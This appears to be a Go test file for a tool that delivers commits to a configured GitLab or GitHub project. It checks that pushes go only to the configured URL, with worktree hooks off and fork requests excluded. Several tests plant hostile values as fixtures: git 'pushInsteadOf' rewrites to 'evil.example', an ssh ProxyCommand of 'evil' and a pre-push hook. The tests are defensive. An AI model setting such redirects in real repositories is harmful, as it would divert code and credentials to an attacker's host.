package main

import (
	"os"
	"path/filepath"
	"reflect"
	"strings"
	"testing"
	"time"
)

// A worktree's origin must be the configured project on the configured
// host, in any of git's URL forms; anything else, a fork, a neighbour or the
// same path on another forge, is not.
func TestOriginMatchesProject(t *testing.T) {
	for _, u := range []string{
		"git@gitlab.example.com:example-org/widgets.git",
		"git@gitlab.example.com:example-org/widgets",
		"https://gitlab.example.com/example-org/widgets.git",
		"https://oauth2:token@gitlab.example.com/example-org/widgets/",
		"ssh://git@gitlab.example.com:2222/example-org/widgets.git",
		"ssh://git@GitLab.Example.com/Example-Org/Widgets.git",
	} {
		if !originIs(u, "gitlab.example.com", "example-org/widgets") {
			t.Errorf("%s: not matched", u)
		}
	}
	for _, u := range []string{
		"git@github.com:example-org/widgets.git",
		"https://github.com/example-org/widgets.git",
		"git@gitlab.example.com:someone/widgets.git",
		"https://gitlab.example.com/example-org/widgets-fork.git",
		"https://gitlab.example.com/example-org/widgets/sub.git",
		"https://gitlab.example.com/other/example-org/widgets.git",
		"/srv/git/example-org/widgets.git",
		"",
	} {
		if originIs(u, "gitlab.example.com", "example-org/widgets") {
			t.Errorf("%s: matched", u)
		}
	}
}

// Nothing in the worktree decides where a push goes: it goes to the URL
// built from the configured host and project. An origin on another forge
// and a push URL to a fork are refused with a skip; a git config rewrite
// of the push URL is refused; a gate that rewrites the config is not
// pushed after.
func TestNothingRedirectsThePush(t *testing.T) {
	cases := map[string]func(h *harness){
		"github origin for a gitlab project": func(h *harness) { h.git.remote = "git@github.com:example-org/widgets.git" },
		"push url to a fork":                 func(h *harness) { h.git.pushRemote = "git@gitlab.example.com:someone/widgets.git" },
		"insteadOf rewrite":                  func(h *harness) { h.git.rewrites = []string{"git@gitlab.example.com:"} },
		"gate rewrites the config": func(h *harness) {
			h.runner.onGate = func() { h.git.config += "\nurl.git@evil.example:.pushinsteadof=git@gitlab.example.com:" }
		},
	}
	for name, set := range cases {
		h := newHarness(t, false, "d")
		doneWithDelivery(t, h, "d")
		set(h)
		h.ticks(3, 5*time.Minute)
		if len(h.forge.pushes) != 0 {
			t.Fatalf("%s: pushed to %v", name, h.forge.pushURLs)
		}
		if got := h.count(KindSkip, "", "d"); got != 1 {
			t.Fatalf("%s: skips = %d, want 1", name, got)
		}
	}
	h := newHarness(t, false, "d")
	doneWithDelivery(t, h, "d")
	h.ticks(1, 5*time.Minute)
	if !reflect.DeepEqual(h.forge.pushURLs, []string{"git@gitlab.example.com:example-org/widgets.git"}) {
		t.Fatalf("pushed to %v, want the configured project's URL", h.forge.pushURLs)
	}
	h.cfg.Repositories["widgets"] = Repository{Forge: "github", Host: "github.com", Project: "example-org/widgets", Transport: "https"}
	if got := pushURL(h.cfg.Repositories["widgets"]); got != "https://github.com/example-org/widgets.git" {
		t.Fatalf("https push URL = %q", got)
	}
}

// The real push goes to the URL given, with hooks off, whatever the
// worktree's hooks and remotes say.
func TestExecPushIgnoresHooksAndOrigin(t *testing.T) {
	root := t.TempDir()
	target, decoy, wt := filepath.Join(root, "target.git"), filepath.Join(root, "decoy.git"), filepath.Join(root, "wt")
	gitRun(t, root, "init", "-q", "--bare", target)
	gitRun(t, root, "init", "-q", "--bare", decoy)
	gitRun(t, root, "clone", "-q", decoy, wt)
	writeFile(t, filepath.Join(wt, "a"), "a\n")
	gitRun(t, wt, "add", "a")
	gitRun(t, wt, "commit", "-q", "-m", "one")
	sha := gitRun(t, wt, "rev-parse", "HEAD")
	writeFile(t, filepath.Join(wt, "hooks", "pre-push"), "#!/bin/sh\ntouch "+filepath.Join(root, "hook-ran")+"\nexit 1\n")
	if err := os.Chmod(filepath.Join(wt, "hooks", "pre-push"), 0o755); err != nil {
		t.Fatal(err)
	}
	gitRun(t, wt, "config", "core.hooksPath", filepath.Join(wt, "hooks"))
	if err := (ExecForge{Timeout: 30 * time.Second}).Push(wt, target, sha, "feature"); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(filepath.Join(root, "hook-ran")); err == nil {
		t.Fatal("the worktree's pre-push hook ran")
	}
	if got := gitRun(t, target, "rev-parse", "refs/heads/feature"); got != sha {
		t.Fatalf("target has %q, want %s", got, sha)
	}
	if out := gitRun(t, decoy, "branch", "--list"); out != "" {
		t.Fatalf("the worktree's origin got %q", out)
	}
	g := ExecGit{Timeout: 30 * time.Second}
	gitRun(t, wt, "config", "url.git@evil.example:.pushInsteadOf", "git@gitlab.example.com:")
	if rw, err := g.Rewrites(wt); err != nil || !reflect.DeepEqual(rw, []string{"git@gitlab.example.com:"}) {
		t.Fatalf("rewrites = %v, %v", rw, err)
	}
	if urls, err := g.RemoteURLs(wt); err != nil || len(urls) != 2 || urls[0] != decoy {
		t.Fatalf("remote urls = %v, %v", urls, err)
	}
	before, _ := g.ConfigHash(wt)
	gitRun(t, wt, "config", "core.sshCommand", "ssh -o ProxyCommand=evil")
	if after, err := g.ConfigHash(wt); err != nil || after == before {
		t.Fatalf("config hash did not change: %v", err)
	}
}

// The real Find asks the configured host.
func TestFindAsksTheConfiguredHost(t *testing.T) {
	shim(t, "glab", `echo "$*" >&2; exit 1`)
	_, err := ExecForge{Timeout: 10 * time.Second}.Find(Repository{Forge: "gitlab", Host: "gitlab.example.com", Project: "a/b"}, "f", "main")
	if err == nil || !strings.Contains(err.Error(), "--hostname gitlab.example.com") {
		t.Fatalf("glab ran %v", err)
	}
	shim(t, "gh", `echo "$*" >&2; exit 1`)
	_, err = ExecForge{Timeout: 10 * time.Second}.Find(Repository{Forge: "github", Host: "github.example.com", Project: "a/b"}, "f", "main")
	if err == nil || !strings.Contains(err.Error(), "-R github.example.com/a/b") {
		t.Fatalf("gh ran %v", err)
	}
}

// A worktree whose origin is not the configured project is not pushed: one
// skip says why, nothing latches, and it is delivered once origin is fixed.
// The push names the exact commit that was checked.
func TestWrongOriginIsNotPushed(t *testing.T) {
	h := newHarness(t, false, "d")
	mr := h.dir + "/mr.md"
	writeFile(t, mr, "The MR description.\n")
	h.status("d", "# Finished\n\nDONE\n")
	h.deliver("d", Deliver{Repository: "widgets", Worktree: h.dir + "/d/wt", Target: "main", MRFile: mr})
	h.git.remote = "git@gitlab.example.com:someone/widgets.git"
	h.ticks(4, 5*time.Minute)
	if len(h.forge.pushes) != 0 || len(h.forge.opens) != 0 {
		t.Fatalf("pushed %v to the wrong origin", h.forge.pushes)
	}
	skips := 0
	for _, e := range h.events() {
		if e.Kind == KindSkip && strings.Contains(skipReason(e), "origin") {
			skips++
		}
	}
	if skips != 1 || len(h.sup.Tracks()["d"].Delivered) != 0 {
		t.Fatalf("origin skips = %d, delivered = %v", skips, h.sup.Tracks()["d"].Delivered)
	}
	h.git.remote = "https://gitlab.example.com/example-org/widgets.git"
	h.ticks(1, 5*time.Minute)
	if !reflect.DeepEqual(h.forge.pushes, []string{"feature"}) || !reflect.DeepEqual(h.forge.pushedSHAs, []string{"c0ffee"}) {
		t.Fatalf("pushes %v of %v, want feature at c0ffee", h.forge.pushes, h.forge.pushedSHAs)
	}
}

// The real push sends the exact commit to the branch, never whatever HEAD
// has become.
func TestPushNamesTheCommit(t *testing.T) {
	shim(t, "git", `echo "$*" >&2; exit 1`)
	err := ExecForge{Timeout: 10 * time.Second}.Push(t.TempDir(), "git@h:p.git", "c0ffee", "feature")
	if err == nil || !strings.Contains(err.Error(), "-c core.hooksPath=/dev/null push --no-verify -q git@h:p.git c0ffee:refs/heads/feature") {
		t.Fatalf("push ran %v", err)
	}
}

// Requests from forks, whose source is another project, are left out of
// Find: they are not this project's delivery.
func TestFindLeavesOutForks(t *testing.T) {
	f := ExecForge{Timeout: 10 * time.Second}
	shim(t, "glab", `echo '[{"iid":2,"state":"opened","sha":"f","web_url":"u2","source_project_id":9,"target_project_id":7},{"iid":1,"state":"opened","sha":"o","web_url":"u1","source_project_id":7,"target_project_id":7}]'`)
	got, err := f.Find(Repository{Forge: "gitlab", Project: "a/b"}, "feature", "main")
	if err != nil || !reflect.DeepEqual(got, []MergeResult{{Ref: "!1", URL: "u1", Head: "o"}}) {
		t.Fatalf("gitlab: %+v %v", got, err)
	}
	shim(t, "gh", `echo '[{"number":2,"state":"OPEN","headRefOid":"f","url":"u2","isCrossRepository":true},{"number":1,"state":"OPEN","headRefOid":"o","url":"u1","isCrossRepository":false}]'`)
	got, err = f.Find(Repository{Forge: "github", Project: "a/b"}, "feature", "main")
	if err != nil || !reflect.DeepEqual(got, []MergeResult{{Ref: "#1", URL: "u1", Head: "o"}}) {
		t.Fatalf("github: %+v %v", got, err)
	}
}
